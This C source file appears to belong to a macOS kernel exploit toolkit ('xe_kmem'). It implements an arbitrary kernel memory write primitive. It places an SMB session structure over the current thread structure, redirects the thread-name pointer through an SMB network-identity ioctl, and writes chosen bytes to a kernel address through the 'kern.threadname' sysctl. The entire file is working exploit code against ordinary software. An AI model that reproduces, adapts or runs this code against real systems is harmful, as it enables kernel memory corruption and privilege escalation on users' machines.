//
//  kmem_write_session.c
//  xe_kmem
//
//  Created by sreejith on 2/25/22.
//

#include <assert.h>
#include <pthread.h>

#include <sys/kauth.h>
#include <sys/sysctl.h>
#include <mach/thread_info.h>

#include <xe/memory/kmem.h>
#include <xe/xnu/proc.h>
#include <xe/xnu/thread.h>
#include <xe/util/assert.h>

#include <macos_params.h>

#include "kmem_write_session.h"
#include "smb/params.h"
#include "smb/client.h"


extern int __telemetry(uint64_t cmd, uint64_t deadline, uint64_t interval, uint64_t leeway, uint64_t arg4, uint64_t arg5);


struct kmem_write_session {
    uintptr_t thread;
    uint64_t thread_id;
    ntsid_t write_data;
};


uint64_t kmem_write_session_get_thread_id(void) {
    uint64_t thread_id;
    int error = pthread_threadid_np(pthread_self(), &thread_id);
    xe_assert_err(error);
    return thread_id;
}


kmem_write_session_t kmem_write_session_create(const struct sockaddr_in* smb_addr) {
    uintptr_t thread = xe_xnu_thread_current_thread();
    
    uintptr_t ith_voucher_name = thread + TYPE_THREAD_MEM_ITH_VOUCHER_NAME_OFFSET;
    xe_assert_cond(xe_kmem_read_uint32(ith_voucher_name, 0), ==, 0);
    uintptr_t thread_name = thread + TYPE_THREAD_MEM_THREAD_NAME_OFFSET;
    
    uintptr_t session = ith_voucher_name - TYPE_SMB_SESSION_MEM_SESSION_FLAGS_OFFSET;
    uintptr_t write_start = session + TYPE_SMB_SESSION_MEM_SESSION_NTWRK_SID_OFFSET;
    uintptr_t write_end = write_start + sizeof(ntsid_t);
    
    xe_assert_cond(write_end, <=, thread + TYPE_THREAD_SIZE);
    xe_assert_cond(write_start, <=, thread_name);
    xe_assert_cond(thread_name + sizeof(uintptr_t), <=, write_end);
    
    struct kmem_write_session* ws = malloc(sizeof(struct kmem_write_session));
    ws->thread = thread;
    xe_kmem_read(&ws->write_data, write_start, 0, sizeof(ws->write_data));
    ws->thread_id = kmem_write_session_get_thread_id();
    
    return ws;
}

void kmem_write_session_write_block(kmem_write_session_t session, int smb_dev, uintptr_t dst, char data[MAXTHREADNAMESIZE]) {
    xe_assert_cond(data[MAXTHREADNAMESIZE - 1], ==, '\0');
    xe_assert_cond(kmem_write_session_get_thread_id(), ==, session->thread_id);
        
    uintptr_t thread = session->thread;
    uintptr_t smb_session = thread + TYPE_THREAD_MEM_ITH_VOUCHER_NAME_OFFSET - TYPE_SMB_SESSION_MEM_SESSION_FLAGS_OFFSET;
    
    int res = __telemetry(2, 0, 0, 0, 0, 0);
    xe_assert_errno(res);
    
    uintptr_t write_start = smb_session + TYPE_SMB_SESSION_MEM_SESSION_NTWRK_SID_OFFSET;
    uintptr_t thread_name = thread + TYPE_THREAD_MEM_THREAD_NAME_OFFSET;
    
    ntsid_t ntsid = session->write_data;
    *((uint64_t*)((char*)&ntsid + (thread_name - write_start))) = dst;
    int error = smb_client_ioc_set_ntwrk_identity(smb_dev, &ntsid);
    xe_assert_err(error);
    
    res = sysctlbyname("kern.threadname", NULL, NULL, data, MAXTHREADNAMESIZE - 1);
    xe_assert_errno(res);
    
    res = __telemetry(2, 0, 0, 0, 0, 0);
    xe_assert_errno(res);
    
    error = smb_client_ioc_set_ntwrk_identity(smb_dev, &session->write_data);
    xe_assert_err(error);
}

uintptr_t kmem_write_session_get_addr(kmem_write_session_t session) {
    uintptr_t thread = session->thread;
    return thread + TYPE_THREAD_MEM_ITH_VOUCHER_NAME_OFFSET - TYPE_SMB_SESSION_MEM_SESSION_FLAGS_OFFSET;
}

void kmem_write_session_destroy(kmem_write_session_t* session_p) {
    uintptr_t thread = xe_xnu_thread_current_thread();
    xe_kmem_write_uint64(thread, TYPE_THREAD_MEM_THREAD_NAME_OFFSET, 0);
    free(*session_p);
    *session_p = NULL;
}
